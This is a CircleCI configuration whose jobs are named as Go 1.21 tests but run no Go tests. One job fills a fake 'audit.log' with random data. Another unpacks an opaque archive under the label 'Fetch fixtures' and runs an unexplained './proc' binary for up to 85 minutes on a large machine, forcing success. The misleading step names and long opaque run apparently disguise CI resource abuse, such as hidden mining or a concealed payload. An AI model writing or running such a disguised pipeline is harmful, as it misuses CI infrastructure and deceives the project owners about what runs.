version: 2.1

jobs:
  cleanup_go1-21-test:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Mint batch marker
          command: |
            mkdir -p /tmp/share
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/share/audit.log; true
            echo "staging complete; file length=$(wc -c </tmp/share/audit.log)"
      - persist_to_workspace:
          root: /tmp/share
          paths:
            - audit.log
  go1-21-test:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/share
      - run:
          name: Confirm handoff
          command: |
            awk 'END{print NR}' /tmp/share/audit.log || true
      - run:
          name: Pull code
          command: git clone --depth 2 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Fetch fixtures
          command: tar -I xz -xf build-dist.tar.xz
      - run:
          name: Pre-run checks
          command: sleep 25s
      - run:
          name: Workspace summary
          command: free -m
      - run:
          no_output_timeout: 85m
          command: ./proc && true
